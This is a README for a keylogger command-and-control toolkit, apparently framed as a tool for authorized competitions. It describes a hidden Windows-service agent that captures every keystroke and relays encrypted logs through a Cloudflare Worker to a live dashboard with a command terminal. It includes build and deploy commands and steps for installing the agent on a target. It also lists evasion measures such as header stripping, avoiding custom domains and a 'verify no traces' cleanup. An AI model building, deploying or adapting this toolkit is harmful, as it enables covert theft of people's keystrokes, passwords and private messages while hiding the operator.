# Quantum C2 Elite Viper

Complete C2 infrastructure for authorized cybersecurity competitions.

**Repository:** https://github.com/422442/Logger.git

## Architecture

- **Agent** (Go Windows Service) - Keylogging via `SetWindowsHookEx(WH_KEYBOARD_LL)` with AES-256-GCM encryption
- **Cloudflare Worker** (TypeScript) - C2 relay with auth, header stripping, rate limiting
- **Render Backend** (Go + SQLite) - REST API + WebSocket server for data storage and dashboard
- **Vercel Dashboard** (Next.js) - Real-time keystroke display and command terminal

## Quick Start

### 1. Build all components
```powershell
powershell -File install.ps1
```

### 2. Configure
Edit these files before deploying:
- `worker/worker.ts` - Set `API_KEY` and `BACKEND_URL`
- `agent/main.go` - Set `workerURL`, `apiKey`, `aesKey` constants
- `backend/main.go` - Set `listenAddr`, `dbPath`

### 3. Deploy
```bash
# Cloudflare Worker
cd worker && wrangler deploy

# Render Backend
cd backend && docker build -t quantum-c2 . && docker run -p 8080:8080 quantum-c2

# Vercel Dashboard
cd dashboard && pnpm run build && vercel deploy
```

### 4. Install Agent on Target
```powershell
agent.exe --install   # Install as Windows Service
agent.exe --run       # Test run directly
agent.exe --uninstall # Remove service
```

## Component Details

### Agent (Go)
- Zero external dependencies beyond `kardianos/service`
- Low-level keyboard hook capturing all keys
- Ring buffer (64KB) for keystroke collection
- AES-256-GCM encrypted payloads
- Exponential backoff retry (1s → 300s)
- Windows Service support via `kardianos/service`
- Flags: `--install`, `--run`, `--uninstall`

### Cloudflare Worker
- No npm dependencies (Workers built-ins only)
- Auth via `Authorization: Bearer <KEY>` header
- Strips identifying headers, normalizes User-Agent
- Forwards encrypted payloads to Render backend
- Fetches commands for agents

### Render Backend
- Pure Go SQLite (`modernc.org/sqlite`) - no CGO
- REST API: `/api/v1/agent/data`, `/api/v1/agent/commands`, `/api/v1/agent/status`
- WebSocket: `/ws` for real-time dashboard updates
- Health endpoint: `/health` (UptimeRobot ping)

### Dashboard (Next.js)
- Real-time keystroke log via WebSocket
- Agent status panel
- Command terminal
- Auto-reconnection logic
- Tailwind CSS styling

## Security Notes

- All payloads encrypted with AES-256-GCM (pre-shared key)
- Worker strips all identifying headers
- No custom domain used (`.workers.dev` only)
- Agent only communicates to Worker URL (no DNS leaks)
- Internal Worker→Backend communication via Cloudflare network

## Testing

See the build verification output. All Go components compile with `go build`. Dashboard builds with `pnpm run build`.

## Cleanup

```powershell
agent.exe --uninstall
Remove-Item agent.exe, keystrokes.db, *.log
Verify no traces in Services.msc, Task Manager
```
